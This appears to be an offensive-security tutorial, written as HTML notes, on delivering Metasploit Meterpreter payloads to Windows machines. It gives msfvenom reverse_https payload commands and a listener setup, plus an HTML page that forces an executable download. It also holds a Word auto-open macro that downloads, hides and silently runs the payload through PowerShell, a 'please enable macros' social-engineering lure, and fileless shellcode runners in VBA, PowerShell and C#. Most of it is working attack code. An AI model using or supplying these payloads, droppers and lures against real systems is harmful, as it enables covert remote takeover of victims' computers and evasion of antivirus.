<div style="background-color: #000000;color: #ffffff;padding: 20px;border-radius: 10px;margin: 20px 0;font-family: 'Courier New', monospace;">


<b><h1>Scenario 1</h1>
- Kali = 192.168.2.3<br>
- Windows = 192.168.2.5<br>
</div>
<h2>Practical explanation<br>
1 ------ Payload Creation<br></h2>
$ Msfvenom-p windows/meterpreter/reverse_https LHOST 192.168.2.3 LPORT 443 -f exe -o /var/www/html/msfstaged.exe <br>
<h2>2 ------ Listener Setup<br></h2>
$ Sudo msfconsole <br>
msf6 > ues exploit/multi/handler<br>
msf6(....) > set payload windows/meterpreter/reverse_https <br>
msf6(....)set lhost 192.168.2.3<br>
msf6(....)set lport 443<br>
msf6(....)set exitnosession false <br>
msf6(....)exploit -j <br>
<h2>3 ------ Hosting Server Setup<br></h2>
$ sudo systemctl status apache 2<br>
$ sudo systemctl start apache2<br>
$ cd /var/www/html<br>
$ base64 msfstaged.exe  -w0 >~/payload.txt<br>
$ sudo mousepad payload.txt<br>
$ sudo touch download.html<br>
<br>

$ mousepad download.html<br>
```csharp
<html>
<body>
<script>
function base64ToArrayBuffer(bnase64) {    var binary_string = window.atob(base64);
    var len = binary_string.length;
    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}
var file = 'put your base64 code here'
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], { type: 'octet/stream' });
var fileName = 'payload.exe';
var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';
var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
</script>
</body>
</html>
````
<h2>Exploitation Tutorial<br>
1 ------<br></h2>
💡The clear purpose of the code is:<br> 
when someone visits a page like http://192.168.2.3/download.html, a file (e.g., shellcode in .exe format) is automatically downloaded without user interaction (i.e., without needing to click a button).<br>
                 <h3>....................</h3><br>
<h2>Scenario 2<br>
1 ------ Malicious Macro Script</h2>

````csharp
Sub Document_Open()
    Ahmed
End Sub

Sub Auto_Open()
    Ahmed
End Sub

Sub Ahmed()
    Dim command As String
    Dim exepath As String
    Dim hideCmd As String

    exepath = ActiveDocument.Path + "\msfstaged.exe"

    command = "powershell -Command (New-Object System.Net.WebClient).DownloadFile('http://192.168.2.3/msfstaged.exe','" + exepath + "')"
    Shell command, vbHide

    wait (4)

    hideCmd = "attrib +h " + exepath

    Shell hideCmd, vbHide
    Shell exepath, vbHide
End Sub

Sub wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
````
<h2>2 ------ Victim Execution Stage</h2>
Victim's machine 
http://192.168.2.3/download.html
<br>
        <h2>Exploitation Tutorial<br>
1 ------</h2>
1. Command: The command first downloads the program (the file msfstaged.exe) from the specified URL to the local path defined in the exepath variable. The downloaded file is saved as msfstaged.exe.<br>
2. exepath: After the file is downloaded, the Shell exepath, vbHide command runs the saved file (msfstaged.exe), effectively executing it.<br>
3. hideCmd: is used to hide the file located at the path specified in exepath.<br>
4. Wait 4:  pauses the execution of the program for 4 seconds to allow enough time for the file to fully download before attempting to run it.<br>
<br>
💡After downloading the file, it is executed using PowerShell by referencing the full path of the file stored in the exepath variable.<br>
<br>
<h2>Summary:<br></h2>
1. When the Word document is opened, the VBA code starts by downloading the executable file msfstaged.exe from a specified URL to the same folder as the document.<br>
2. The program then pauses for 4 seconds to ensure the file has been fully downloaded.<br>
3. After that, the file is hidden using the attrib +h command and executed silently using the Shell function.<br>
                 <h2>....................<br></h2>
<h2>Scenario 3<br>
1 ------Disguised Macro Script<br></h2>

````csharp
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    ActiveDocument.Content.Select
    Selection.Delete
    ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoC").Insert Where:=Selection.Range, RichText:=True
End Sub
````
<h2>2 ------Social Engineering Technique</h2><br>
For example, you create a Word file that contains malware embedded in the macro to establish a reverse connection. Then you send the Word file to the victim, but the victim must click "Enable Macros" for the code to execute.<br>
<br>
💡To convince the victim, you insert random or encrypted-looking text into the document along with a message like:
<br>
● This document is protected. Please enable macros to view the content."<br>
or<br>
● Content is encrypted. Click 'Enable Content' to decrypt."<br>
<br>
This makes it seem like the content is hidden and needs to be "unlocked."<br>
<br>
Then, you use a macro that deletes the meaningless content and replaces it with normal, readable text once macros are enabled — so the victim doesn't suspect anything unusual.<br>
.......<br>
💡Important Note:<br>
> When you want to call an object, you need to use a method like WScript.CreateObject or New-Object -ComObject to interact with it inside the script, whether you're using VBScript or PowerShell.<br>
💡This acts like a "gateway" that gives you access to the objects inside the system.<br>
                 ....................<br>
                 ....................<br>
<h1 align="center">Fileless malware</h1>
Fileless malware is a type of malicious software that doesn't get stored as a file on the disk. Instead, it operates directly in memory (RAM), making it harder for traditional antivirus programs to detect.<br>
                           ....................<br>
<h2>Fileless malware with VBA<br></h2>
<h2>Practical explanation<br>  
1 ------</h2><br>
$ Msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.3 LPORT=443 
EXITFUNC=thread -f vbapplication -o /mnt/share/vbapplication.txt<br>  
<h2>2 ------</h2><br>  
$ cd /mnt/share <br>  
<br>  
$ mousepad vbapplication.txt<br>   
<br>  
Take all the contents of the file and place them in the code ⬇️.<br>  
<h2>3 ------</h2><br>  

````
Private Declare Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As Long, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef Threadid As Long) As Long

Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long

Private Declare Function RtlMoveMemory Lib "KERNEL32" (ByVal lpDestination As Long, ByRef Source As Any, ByVal Length As Long) As Long

Sub MyMacro()
    Dim buf As Variant
    Dim addr As Long
    Dim counter As Long
    Dim data As Long
    Dim res As Long

    ' But your shellcode here '

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
````````
<h2>Exploitation Tutorial<br>  
1 ------<br></h2>
This code relies on three different Windows API functions, which are:<br>
<br>
1. VirtualAlloc<br>
Purpose:<br>
Allocates a block of memory in the process with read, write, and execute permissions — necessary for storing and running shellcode.<br>
---<br>
2. RtlMoveMemory<br>
Purpose:<br>
Copies the shellcode (or any data) into the allocated memory space.<br>
---<br>
3. CreateThread<br>
Purpose:<br>
Creates a new thread that starts execution from the specified memory address — in this case, where the shellcode was placed.<br>
                           ....................<br>
💡You can shorten this code using msfvenom from Metasploit by generating a payload in the VBA format instead of vbapplication.<br>
This format can be used to embed the malicious code inside a Word document (for example) through a VBA macro, allowing the code to execute automatically when the macro is enabled.<br>
                           ....................
                           ....................
<h2>Fileless malware with PowerShell</h2><br> 
<h2>Practical explanation<br>   
1 ------Payload Generation</h2><br>
$ Msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.3 LPORT=443
EXITFUNC=thread -f ps1 -o /mnt/share/ps1.txt<br>
<h2>2 ------Shellcode Extraction</h2><br>
$ cd /mnt/share <br>
$ mousepad ps1.txt<br>
<br>
Take all the contents of the file and place them in the code ⬇️.<br>
<h2>3 ------Fileless VBA Execution</h2><br>

````
$Kerne132 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32
 {
[DllImport ("kernel32.dll")]
public static extern
IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport ("kernel32.dll", CharSet=CharSet.Ansi)]
public static extern
IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport ("kernel32.dll", SetLastError=true)]
public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $Kerne132

 But your shellcode here 

$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size, 0x3000, 0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle=[Kernel32]::CreateThread(0,0, $addr,0,0,0);
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
 ````
<h2>Exploitation Tutorial<br>
1 ------</h2><br>
This code relies on three different Windows API functions, which are:<br>
<br>
1. VirtualAlloc<br>
Purpose:<br>
Allocates a block of memory in the process with read, write, and execute permissions — necessary for storing and running shellcode.<br>
---<br>
2. Marshal.Copy<br>
Purpose:<br>
Copies the shellcode (or any byte array) into the allocated memory space using .NET's built-in method instead of calling the RtlMoveMemory API directly.<br>
---<br>
3. CreateThread<br>
Purpose:<br>
Creates a new thread that starts execution from the specified memory address — in this case, where the shellcode was placed.<br>
                           ....................<br>
                           ....................<br>
<h2>Fileless malware with csharp C#</h2><br>
<h2>Practical explanation<br>   
1 ------Payload Generation</h2><br>
$ Msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.3 LPORT=443
EXITFUNC=thread -f csharp -o /mnt/share/csharp.txt<br>
<h2>2 ------Shellcode Extraction</h2><br>
$ cd /mnt/share <br>
$ mousepad csharp.txt<br>
<br>
Take all the contents of the file and place them in the code ⬇️.<br>
<h2>3 ------Fileless C# Execution</h2><br>

````
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
           (But your shellcode here)
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }
    }
}
````
<h2>Exploitation Tutorial<br>
1 ------</h2><br>
This code relies on three different Windows API functions, which are:<br>
<br>
1. VirtualAlloc<br>
Purpose:<br>
Allocates a block of memory in the process with read, write, and execute permissions — necessary for storing and running shellcode.<br>
---<br>
2. Marshal.Copy<br>
Purpose:<br>
Copies the shellcode (or any byte array) into the allocated memory space using .NET's built-in method instead of calling the RtlMoveMemory API directly.<br>
---<br>
3. CreateThread<br>
Purpose:<br>
Creates a new thread that starts execution from the specified memory address — in this case, where the shellcode was placed.<br>
                 ....................<br>
                 ....................<br>
<h1 align="center">API</h1><br>        
<h2>VirtualAlloc</h2><br>  
The VirtualAlloc function in Windows is used to allocate memory within a process. It takes four main parameters:<br>  
<br> 
1. lpAddress: The starting address (use NULL to let the system choose).<br> 
2. dwSize: The size of memory to allocate (in bytes).<br> 
3. flAllocationType: The allocation type, like MEM_COMMIT or MEM_RESERVE.<br> 
4. flProtect: Memory protection, such as PAGE_READWRITE or PAGE_EXECUTE_READWRITE.<br> 
<br> 
☢️ To use VirtualAlloc in C#, you need to include the using System;<br> 
like this:<br> 
using System;<br> 
<br> 
💡In short, VirtualAlloc reserves memory space, and its address is stored in a variable like addr, which is later used as the destination in the coby.marshal function to transfer data from the source.<br> 

````
IntPtr addr = VirtualAlloc (IntPtr. Zero,0x1000, 0x3000, 0x40 )<br>
````
....................<br> 
<h2>Marshal.Copy</h2><br> 
The coby.marshal function is an API used to copy data from a source to a destination. It takes four main parameters:<br> 
<br> 
1. source: The original buffer or payload containing the data to be copied.<br> 
2. start index: The position within the source where the copy operation should begin.<br> 
3. destination: The target location where the data will be copied to.<br> 
4. length: The number of bytes (or the size of the data) to be copied.<br> 
<br> 
☢️ To use Marshal.Copy in C#, you need to include the System.Runtime.InteropServices library<br> 
like this:<br> 
using System.Runtime.InteropServices;<br> 
<br> 
💡In simple terms, this API extracts a portion of the buffer from the source, starting at a specific index and for a defined length, and copies it into the destination.<br> 

````
Marshal.Copy(buf, 0, addr, size);<br>
```` 
....................<br> 
<h2>CreateThread</h2><br> 
The CreateThread function is used in Windows to create a new thread within the process. It takes 6 main parameters:<br> 
<br> 
1. lpThreadAttributes: Specifies security attributes for the thread (typically NULL for default attributes).<br> 
2. dwStackSize: The size of the memory to be allocated for the thread’s stack.<br> 
3. lpStartAddress: The address of the function to be executed by the thread.<br> 
4. lpParameter: A parameter to be passed to the function that the thread will execute.<br> 
5. dwCreationFlags: Flags that control how the thread is created, such as CREATE_SUSPENDED to start the thread in a suspended state.<br> 
6. lpThreadId: A pointer to a variable that receives the thread identifier (thread ID) if the function succeeds.<br> 
<br> 
☢️ To use CreateThread in C#, you need to include the using System;<br> 
like this:<br> 
using System;<br> 
<br> 
💡In short, CreateThread is used to create a new thread to execute code asynchronously within the same process.<br>

````
intPtr hthread = CreateThread (IntPtr. Zero, 0, addr, IntPtr. Zero, 0, IntPtr. Zero);
````
....................<br> 
<h2>💡Summary</h2><br> 
1. VirtualAlloc: Reserves space in the memory within the process's virtual address space.<br> 
2. coby.marshal: Copies the payload to the reserved memory space allocated by VirtualAlloc.<br> 
3. CreateThread: Creates a new thread that executes the code (payload) copied into the reserved memory, running concurrently with the original process.<br> 
<br> 
Example:<br> 

````
byte[] buf = new byte (payload)
int size = buf.Length;
IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
Marshal.Copy(buf, 0, addr, size);
IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
````
💡So, the payload is loaded and executed asynchronously using a new thread, allowing the injected code to run while the original process continues to operate.<br> 
                           ..................<b/>


                           
                           
